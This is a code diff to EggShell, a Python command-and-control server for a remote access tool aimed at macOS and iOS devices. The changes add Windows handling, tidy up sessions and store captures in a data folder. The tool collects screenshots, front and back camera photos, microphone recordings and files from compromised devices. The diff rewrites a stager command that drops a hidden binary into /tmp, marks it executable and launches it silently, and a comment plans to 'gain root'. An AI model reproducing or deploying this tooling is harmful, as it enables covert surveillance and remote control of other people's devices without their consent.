@@ -1,6 +1,7 @@
 #!/usr/bin/python
 #EggShell
 #Created By lucas.py 8-18-16
+#TODO: Gain root, and fix for any system() call locally
 debug = 0
 
 import base64
@@ -22,14 +23,25 @@ escrypt = ESEncryptor(shellKey,16)
 sessions = {}
 
 #MARK: UI
-RED = '\033[1;91m'
-ENDC = '\033[0m'
-UNDERLINE_GREEN = '\033[4;92m'
-GREEN = '\033[1;92m'
-WHITE = '\033[0;97m'
-WHITEBU = '\033[1;4m'
-COLOR_INFO = '\033[0;36m'
-NES = '\033[4;32m'+"NES"+WHITE+"> "
+if sys.platform.startswith('win'):
+    RED = ''
+    ENDC = ''
+    UNDERLINE_GREEN = ''
+    GREEN = ''
+    WHITE = ''
+    WHITEBU = ''
+    COLOR_INFO = ''
+    NES= "NES> "
+else:
+    RED = '\033[1;91m'
+    ENDC = '\033[0m'
+    UNDERLINE_GREEN = '\033[4;92m'
+    GREEN = '\033[1;92m'
+    WHITE = '\033[0;97m'
+    WHITEBU = '\033[1;4m'
+    COLOR_INFO = '\033[0;36m'
+    NES = '\033[4;32m'+"NES"+WHITE+"> "
+
 BANNER_ART_TEXT = GREEN+"""
 .---.          .-. .        . .       \\      `.
 |             (   )|        | |     o  \\       `.
@@ -93,7 +105,7 @@ def bbde(data):
     return base64.b64decode(data)
 
 def showLocalHelp():
-    print WHITEBU+"Local Commands:"+"\n"+ENDC
+    print WHITEBU+"Local Commands (Do not work on windows):"+"\n"+ENDC
     showCommand("lls","list contents of local directory")
     showCommand("lcd","change local directories")
     showCommand("lpwd","get current local directory")
@@ -278,7 +290,7 @@ def receiveString(conn):
         while 1:
             data += conn.recv(2048)
             if not data:
-                return "we fucked up"
+                return "we fucked up, disconnecting (please type 'back' to leave this page)"
             #terminator to notify when we are done receiving data
             #useful for getting however much data we want
             if terminator in data:
@@ -323,7 +335,7 @@ def downloadFile(command,conn):
     try:
         sizeofFile = int(receiveString(conn))
     except:
-        print "oops, couldnt get file size"
+        print "oops, couldnt get file size ( maybe user doesn't have a camera? well rip you just got disconnected :( )"
         return
     if sizeofFile == -1:
         print "file does not exist"
@@ -340,17 +352,17 @@ def downloadFile(command,conn):
     filename = ""
     dateFormat = "%Y%m%d%H%M%S"
     if args[0] == "screenshot":
-        filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/screenshot"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "picture":
-        filename = "isight"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/isight"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "frontcam":
-        filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/frontcamera"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "backcam":
-        filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/backcamera"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "mic":
-        filename = "mic"+time.strftime(dateFormat)+".aac"
+        filename = "data/mic"+time.strftime(dateFormat)+".aac"
     else:
-        filename = command[9:]
+        filename = "data/"+command[9:]
 
     progress = 0
     file = open(os.getcwd()+"/.tmpfile", "a+b")
@@ -413,7 +425,7 @@ def promptHostPort():
     print strinfo("LHOST = " + lhost)
     portChoice = raw_input("SET LPORT (Leave blank for "+str(lport)+")>")
     if portChoice != "":
-        lport = portChoice
+		lport = portChoice
     print strinfo("LPORT = " + str(lport))
     return [lhost,lport]
 
@@ -483,6 +495,7 @@ class SessionHandler:
         hostAddress = addr[0]
         if verbose:
             print strinfo("Connecting to "+hostAddress)
+            print strinfo("Args: "+INSTRUCT_BINARY_ARGUMENT)
         conn.send(INSTRUCT_STAGER)
         CDA = conn.recv(128)
 
@@ -505,7 +518,8 @@ class SessionHandler:
             binaryFile = open("src/binaries/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /usr/bin/.espl 2> /dev/null; cat >/usr/bin/.espl; chmod +x /usr/bin/.espl; exit & /usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+			#fixed problem where user couldn't write to mobile, but now we need root for somethings?
+            preload = "rm /tmp/.espl 2> /dev/null; cat >/tmp/.espl; chmod +x /tmp/.espl; /tmp/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 print strinfo("Detected Linux, this isn't supported yet")
@@ -533,7 +547,9 @@ class SessionHandler:
             print strinfo("Waiting For Connection...")
         conn, hostAddress = s.accept()
         data = receiveString(conn)
-
+        lafix = Thread(target = delayfive, args=(s,))
+        lafix.daemon=True
+        lafix.start()
         if data: #payload should return the name of the device and we will use that as our prompt
             self.uid = data.split(" ")[0]
             data = data.replace(self.uid+" ","")
@@ -545,6 +561,11 @@ class SessionHandler:
             s.close()
             return [name,conn,host,port,CDA]
 
+def delayfive(s):
+    time.sleep(5)
+    s.close()
+    s.close()
+			
 #MARK: MultiServer
 
 def multiServer(host,port):
@@ -553,7 +574,7 @@ def multiServer(host,port):
     print "type \"help\" for MultiServer commands"
     while 1:
         newsession = SessionHandler()
-        newsession.listen(0,host,port)
+        newsession.listen(debug,host,port)
         skip = 0
         for sx in sessions:
             if newsession.uid == sessions[sx].uid:
@@ -568,14 +589,19 @@ def multiServer(host,port):
         sys.stdout.flush()
         x += 1
 
+		
 def multiServerSessionInteract(args):
     if len(args) == 2:
         try:
             s = sessions[int(args[1])]
-            if initSHELL(s.name,s.conn,s.host,s.port,s.CDA) == -1:
-                multiServerSessionClose(args)
+            try:
+				s.conn.getpeername()[0]
+				if initSHELL(s.name,s.conn,s.host,s.port,s.CDA) == -1:
+					multiServerSessionClose(args)
+            except:
+                del sessions[int(args[1])]
         except:
-            print strinfo("Session not found")
+			print strinfo("Session not found")
 
 def multiServerSessionClose(args):
     if len(args) == 2:
@@ -591,6 +617,10 @@ def multiServerSessionClose(args):
 def multiServerListSessions():
     for key,value in sessions.iteritems():
         if value.name:
+            try:
+                value.conn.getpeername()[0]
+            except:
+                del sessions[key]
             print "Session [" + str(key) + "] | " + value.name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + value.conn.getpeername()[0]
 
 #TODO: finish this function lol
@@ -622,19 +652,22 @@ def multiServerController(port,bgserver):
             continue
         cmd = input.split()
         #commands
-        if cmd[0] == "interact":
-            multiServerSessionInteract(cmd)
-        elif cmd[0] == "sessions":
-            multiServerListSessions()
-        elif cmd[0] == "close":
-            multiServerSessionClose(cmd)
-        elif cmd[0] == "help":
-            multiServerHelp()
-        elif cmd[0] == "exit":
-            multiServerExit(bgserver)
-            break
-        else:
-            print "invalid command"
+        try:
+            if cmd[0] == "interact":
+                multiServerSessionInteract(cmd)
+            elif cmd[0] == "sessions":
+                multiServerListSessions()
+            elif cmd[0] == "close":
+                    multiServerSessionClose(cmd)
+            elif cmd[0] == "help":
+                multiServerHelp()
+            elif cmd[0] == "exit":
+                multiServerExit(bgserver)
+                break
+            else:
+                print "invalid command"
+        except:
+            print "error executing command! please try again!"
     interactiveMenu()
 
 def main():
@@ -642,6 +675,6 @@ def main():
     try:
         interactiveMenu()
     except (KeyboardInterrupt, EOFError) as e:
-        print ""
+        pass
 
 main()
